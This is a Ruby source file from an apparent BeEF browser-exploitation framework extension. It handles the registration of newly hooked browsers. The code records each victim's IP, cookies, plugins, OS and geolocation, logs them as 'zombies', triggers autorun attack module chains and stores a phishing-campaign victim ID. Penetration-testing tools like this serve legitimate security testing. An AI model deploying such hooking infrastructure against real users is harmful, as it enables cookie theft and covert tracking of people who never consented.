# Little shortened original class from core/main/handlers/modules/browserdetails.rb
module BeEF
module Extension
module Gdrive

  class BrowserDetails
  @data = {}

  HB = BeEF::Core::Models::HookedBrowser
  BD = BeEF::Core::Models::BrowserDetails

  def initialize(data)
    @data = data
    setup()
  end

  def err_msg(error)
    print_error "[Browser Details] #{error}"
  end

  def setup()
    print_debug "[INIT] Processing Browser Details..."
    config = BeEF::Core::Configuration.instance

    # Validate hook session value
    session_id = get_param(@data, 'beefhook')
    unless BeEF::Filters.is_valid_hook_session_id?(session_id) then
      self.err_msg "session id is invalid"
      return
    end

    # Check if browser is already registered with framework
    return unless HB.first(:session => session_id).nil?


    # Create the structure representing the hooked browser
    ip = @data['results']['IP']
    zombie = BeEF::Core::Models::HookedBrowser.new(:ip => ip, :session => session_id)
    zombie.firstseen = Time.new.to_i

    # hostname
    unless @data['results']['HostName'].nil? then
      zombie.domain=@data['results']['HostName']
    else
      zombie.domain="unknown"
    end

    # port
    unless @data['results']['HostPort'].nil? then
      zombie.port=@data['results']['HostPort']
    else
      zombie.port = 0
    end

    # We dont have any HTTP headers cos we cant see zombie requests :(
    zombie.httpheaders = "{}"
    zombie.save

    # Add a log entry for the newly hooked browser
    BeEF::Core::Logger.instance.register('Zombie',
          "#{zombie.ip} just joined the horde from the domain:
                        #{zombie.domain}:#{zombie.port.to_s}",
          "#{zombie.id}"
    )

    # Get and store browser name
    browser_name = get_param(@data['results'], 'BrowserName')
    if BeEF::Filters.is_valid_browsername?(browser_name)
      BD.set(session_id, 'BrowserName', browser_name)
    else
      self.err_msg "Invalid browser name returned from the hook browser's initial connection."
    end

    # Lookup zombie host name
    ip_str = zombie.ip
    if config.get('beef.dns_hostname_lookup')
      begin
        require 'resolv'
        host_name = Resolv.getname(zombie.ip).to_s
        if BeEF::Filters.is_valid_hostname?(host_name)
          ip_str += " [#{host_name}]"
        end
      rescue
        print_debug "[INIT] Reverse lookup failed - No results for IP address '#{zombie.ip}'"
      end
    end
    BD.set(session_id, 'IP', ip_str)

    # Geolocation
    if config.get('beef.geoip.enable')
      require 'geoip'
      geoip_file = config.get('beef.geoip.database')
      if File.exists? geoip_file
        geoip = GeoIP.new(geoip_file).city(zombie.ip)
        if geoip.nil?
          print_debug "[INIT] Geolocation failed - No results for IP address '#{zombie.ip}'"
        else
          #print_debug "[INIT] Geolocation results: #{geoip}"
          BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", "#{zombie.id}")
          BD.set(session_id, 'LocationCity', "#{geoip['city_name']}")
          BD.set(session_id, 'LocationCountry', "#{geoip['country_name']}")
          BD.set(session_id, 'LocationCountryCode2', "#{geoip['country_code2']}")
          BD.set(session_id, 'LocationCountryCode3', "#{geoip['country_code3']}")
          BD.set(session_id, 'LocationContinentCode', "#{geoip['continent_code']}")
          BD.set(session_id, 'LocationPostCode', "#{geoip['postal_code']}")
          BD.set(session_id, 'LocationLatitude', "#{geoip['latitude']}")
          BD.set(session_id, 'LocationLongitude', "#{geoip['longitude']}")
          BD.set(session_id, 'LocationDMACode', "#{geoip['dma_code']}")
          BD.set(session_id, 'LocationAreaCode', "#{geoip['area_code']}")
          BD.set(session_id, 'LocationTimezone', "#{geoip['timezone']}")
          BD.set(session_id, 'LocationRegionName', "#{geoip['real_region_name']}")
        end
      else
        print_error "[INIT] Geolocation failed - Could not find MaxMind GeoIP database '#{geoip_file}'"
        print_more "Download: http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz"
      end
    end

    # Get and store browser version
    browser_version = get_param(@data['results'], 'BrowserVersion')
    if BeEF::Filters.is_valid_browserversion?(browser_version)
      BD.set(session_id, 'BrowserVersion', browser_version)
    else
      self.err_msg "Invalid browser version returned from the hook browser's initial connection."
    end

    # Get and store browser string
    browser_string = get_param(@data['results'], 'BrowserReportedName')
    if BeEF::Filters.is_valid_browserstring?(browser_string)
      BD.set(session_id, 'BrowserReportedName', browser_string)
    else
      self.err_msg "Invalid browser string returned from the hook browser's initial connection."
    end

    # Get and store browser language
    browser_lang = get_param(@data['results'], 'BrowserLanguage')
    BD.set(session_id, 'BrowserLanguage', browser_lang)

    # Get and store the cookies
    cookies = get_param(@data['results'], 'Cookies')
    if BeEF::Filters.is_valid_cookies?(cookies)
      BD.set(session_id, 'Cookies', cookies)
    else
      self.err_msg "Invalid cookies returned from the hook browser's initial connection."
    end

    # Get and store the OS name
    os_name = get_param(@data['results'], 'OsName')
    if BeEF::Filters.is_valid_osname?(os_name)
      BD.set(session_id, 'OsName', os_name)
    else
      self.err_msg "Invalid operating system name returned from the hook browser's initial connection."
    end

    # Get and store the OS version
    # (without checks as it can be very different or even empty, for instance on linux/bsd)
    os_version = get_param(@data['results'], 'OsVersion')
    BD.set(session_id, 'OsVersion', os_version)

    # Get and store default browser
    default_browser = get_param(@data['results'], 'DefaultBrowser')
    BD.set(session_id, 'DefaultBrowser', default_browser)

    # Get and store the hardware name
    hw_name = get_param(@data['results'], 'Hardware')
    if BeEF::Filters.is_valid_hwname?(hw_name)
      BD.set(session_id, 'Hardware', hw_name)
    else
      self.err_msg "Invalid hardware name returned from the hook browser's initial connection."
    end

    # Get and store the date
    date_stamp = get_param(@data['results'], 'DateStamp')
    if BeEF::Filters.is_valid_date_stamp?(date_stamp)
      BD.set(session_id, 'DateStamp', date_stamp)
    else
      self.err_msg "Invalid date returned from the hook browser's initial connection."
    end

    # Get and store page title
    page_title = get_param(@data['results'], 'PageTitle')
    if BeEF::Filters.is_valid_pagetitle?(page_title)
      BD.set(session_id, 'PageTitle', page_title)
    else
      self.err_msg "Invalid page title returned from the hook browser's initial connection."
    end

    # Get and store page uri
    page_uri = get_param(@data['results'], 'PageURI')
    if BeEF::Filters.is_valid_url?(page_uri)
      BD.set(session_id, 'PageURI', page_uri)
    else
      self.err_msg "Invalid page URL returned from the hook browser's initial connection."
    end

    # Get and store the page referrer
    page_referrer = get_param(@data['results'], 'PageReferrer')
    if BeEF::Filters.is_valid_pagereferrer?(page_referrer)
      BD.set(session_id, 'PageReferrer', page_referrer)
    else
      self.err_msg "Invalid page referrer returned from the hook browser's initial connection."
    end

    # Get and store hostname
    host_name = get_param(@data['results'], 'HostName')
    if BeEF::Filters.is_valid_hostname?(host_name)
      BD.set(session_id, 'HostName', host_name)
    else
      self.err_msg "Invalid host name returned from the hook browser's initial connection."
    end

    # Get and store the browser plugins
    browser_plugins = get_param(@data['results'], 'BrowserPlugins')
    if BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
      BD.set(session_id, 'BrowserPlugins', browser_plugins)
    else
      self.err_msg "Invalid browser plugins returned from the hook browser's initial connection."
    end

    # Get and store the system platform
    system_platform = get_param(@data['results'], 'BrowserPlatform')
    if BeEF::Filters.is_valid_system_platform?(system_platform)
      BD.set(session_id, 'BrowserPlatform', system_platform)
    else
      self.err_msg "Invalid browser platform returned from the hook browser's initial connection."
    end

    # Get and store the hooked browser type
    browser_type = get_param(@data['results'], 'BrowserType')
    if BeEF::Filters.is_valid_browsertype?(browser_type)
      BD.set(session_id, 'BrowserType', browser_type)
    else
      self.err_msg "Invalid hooked browser type returned from the hook browser's initial connection."
    end

    # Get and store the zombie screen size and color depth
    screen_size = get_param(@data['results'], 'ScreenSize')
    if BeEF::Filters.is_valid_screen_size?(screen_size)
      BD.set(session_id, 'ScreenSize', screen_size)
    else
      self.err_msg "Invalid screen size returned from the hook browser's initial connection."
    end

    # Get and store the window size
    window_size = get_param(@data['results'], 'WindowSize')
    if BeEF::Filters.is_valid_window_size?(window_size)
      BD.set(session_id, 'WindowSize', window_size)
    else
      self.err_msg "Invalid window size returned from the hook browser's initial connection."
    end

    # Get and store the yes|no value for browser components
    components = [
        'VBScriptEnabled', 'HasFlash', 'HasPhonegap', 'HasGoogleGears',
        'HasWebSocket', 'HasWebRTC', 'HasActiveX',
        'HasQuickTime', 'HasRealPlayer', 'HasWMP',
        'hasSessionCookies', 'hasPersistentCookies'
    ]
    components.each do |k|
      v = get_param(@data['results'], k)
      if BeEF::Filters.is_valid_yes_no?(v)
        BD.set(session_id, k, v)
      else
        self.err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
      end
    end

    # Get and store the value for CPU
    cpu_type = get_param(@data['results'], 'CPU')
    if BeEF::Filters.is_valid_cpu?(cpu_type)
      BD.set(session_id, 'CPU', cpu_type)
    else
      self.err_msg "Invalid value for CPU returned from the hook browser's initial connection."
    end

    # Get and store the value for TouchEnabled
    touch_enabled = get_param(@data['results'], 'TouchEnabled')
    if BeEF::Filters.is_valid_yes_no?(touch_enabled)
      BD.set(session_id, 'TouchEnabled', touch_enabled)
    else
      self.err_msg "Invalid value for TouchEnabled returned from the hook browser's initial connection."
    end

    # Log a few info of newly hooked zombie in the console
    print_info "New Hooked Browser [id:#{zombie.id}, ip:#{zombie.ip}, browser:#{browser_name}-#{browser_version}, os:#{os_name}-#{os_version}], hooked domain [#{zombie.domain}:#{zombie.port.to_s}]"

    # Add localhost as network host
    if config.get('beef.extension.network.enable')
      print_debug("Hooked browser has network interface 127.0.0.1")
      BeEF::Core::Models::NetworkHost.add(:hooked_browser_id => session_id, :ip => '127.0.0.1', :hostname => 'localhost', :os => BeEF::Core::Models::BrowserDetails.get(session_id, 'OsName'))
    end

    # Autorun Rule Engine - Check if the hooked browser type/version and OS type/version match any Rule-sets
    # stored in the BeEF::Core::AutorunEngine::Models::Rule database table
    # If one or more Rule-sets do match, trigger the module chain specified
    #
    are = BeEF::Core::AutorunEngine::Engine.instance
    match_rules = are.match(browser_name, browser_version, os_name, os_version)
    are.trigger(match_rules, zombie.id) if match_rules.length > 0

    if config.get('beef.integration.phishing_frenzy.enable')
      # get and store the browser plugins
      victim_uid = get_param(@data['results'], 'PhishingFrenzyUID')
      if BeEF::Filters.alphanums_only?(victim_uid)
        BD.set(session_id, 'PhishingFrenzyUID', victim_uid)
      else
        self.err_msg "Invalid PhishingFrenzy Victim UID returned from the hook browser's initial connection."
      end
    end
  end

  def get_param(query, key)
    (query.class == Hash and query.has_key?(key)) ? query[key] : nil
  end
  end
end
end
end

